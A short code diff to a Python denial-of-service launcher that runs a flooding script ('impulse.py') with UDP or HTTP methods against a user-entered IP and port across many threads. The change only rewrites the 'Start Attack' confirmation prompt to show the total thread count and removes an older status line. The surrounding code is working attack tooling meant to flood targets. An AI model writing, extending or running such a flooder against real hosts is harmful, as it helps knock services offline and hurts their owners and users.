@@ -122,7 +122,9 @@ def udp():
   os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
-yesno = input(Fore.RED+"  Start Attack on "+ip+" With "+str(count)+"x Multiplier"+"? Y/N: ")
+counted = count * threadcount
+
+yesno = input(Fore.LIGHTYELLOW_EX+"  Start Attack on "+ip+" With "+str(counted)+" Threads"+"? Y/N: ")
 
 if yesno == "n":
   print(Fore.BLUE+"  Exiting...")
@@ -135,10 +137,6 @@ if yesno == "N":
   time.sleep(2)
   os.system("clear")
   exit()
-
-counted = count * threadcount
-
-print(Fore.LIGHTYELLOW_EX+"Hitting "+ip+"With "+str(counted)+" Threads using "+hitmethod)
 
 if hitmethod == "HTTP":
   t1 = threading.Thread(target=http)
